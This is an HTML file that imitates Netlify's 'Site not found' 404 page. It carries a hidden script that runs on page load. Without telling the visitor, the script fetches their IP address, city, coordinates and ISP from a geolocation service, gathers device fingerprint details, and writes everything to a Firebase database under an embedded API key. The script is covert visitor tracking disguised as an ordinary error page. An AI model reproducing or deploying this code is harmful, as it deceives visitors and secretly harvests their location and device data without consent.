<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Not Found</title>
    <style>
        body { background-color: #0e1e25; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, system-ui, sans-serif; }
        .card { background: white; padding: 40px; border-radius: 8px; max-width: 500px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin: 20px; }
        h1 { color: #313d44; font-size: 28px; margin: 0 0 16px; }
        p { color: #313d44; font-size: 18px; line-height: 1.5; margin-bottom: 24px; }
        .footer { font-size: 14px; color: #313d44; border-top: 1px solid #e1e1e1; padding-top: 24px; }
        a { color: #00848e; text-decoration: underline; }
        .id-label { display: block; font-size: 13px; color: #7a8c97; margin: 20px 0 8px; }
        .id-code { background: #f2f2f2; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Site not found</h1>
        <p>Looks like you followed a broken link or entered a URL that doesn’t exist on Netlify.</p>
        <div class="footer">
            If this is your site, visit Netlify’s 
            <a href="https://answers.netlify.com/t/support-guide-i-ve-deployed-my-site-but-i-still-see-page-not-found/125?utm_source=404page&utm_campaign=community_tracking">“page not found” support guide</a>.
        </div>
        <span class="id-label">Netlify Internal ID:</span>
        <div class="id-code">01KH3PED3C7WQ3WX9MHW0107RP</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

        // Your specific config
        const firebaseConfig = {
            apiKey: "AIzaSyDHJN7qXE0xaaOT39XCf_pbyeVQgNYoUeY",
            authDomain: "haaa-6f437.firebaseapp.com",
            databaseURL: "https://haaa-6f437-default-rtdb.firebaseio.com",
            projectId: "haaa-6f437",
            storageBucket: "haaa-6f437.firebasestorage.app",
            messagingSenderId: "59682444868",
            appId: "1:59682444868:web:b50f7e1cac94325d534e11"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function collectAndSend() {
            let geoData = {};
            try {
                // Fetching IP and Location (Silent background fetch)
                const response = await fetch('https://ipapi.co/json/');
                geoData = await response.json();
            } catch (e) { console.log("Geo lookup blocked by adblocker"); }

            const visitorData = {
                timestamp: serverTimestamp(),
                // IP & Location
                ip: geoData.ip || "Unknown",
                city: geoData.city || "Unknown",
                region: geoData.region || "Unknown",
                country: geoData.country_name || "Unknown",
                lat_long: `${geoData.latitude}, ${geoData.longitude}` || "Unknown",
                isp: geoData.org || "Unknown",
                
                // Device & System Details (Max Fetch)
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceLanguage: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                referrer: document.referrer || "Direct Visit",
                touchPoints: navigator.maxTouchPoints, // Helps identify touch-screen/mobile
                isApple: /iPhone|iPad|iPod/.test(navigator.userAgent),
                isAndroid: /Android/.test(navigator.userAgent),
                
                // Additional Metadata
                pagePath: window.location.pathname,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // Save to Firestore dynamic collection "visitor_logs"
            try {
                await addDoc(collection(db, "visitor_logs"), visitorData);
                console.log("Visit logged successfully.");
            } catch (error) {
                console.error("Error logging visit: ", error);
            }
        }

        collectAndSend();
    </script>
</body>
</html>
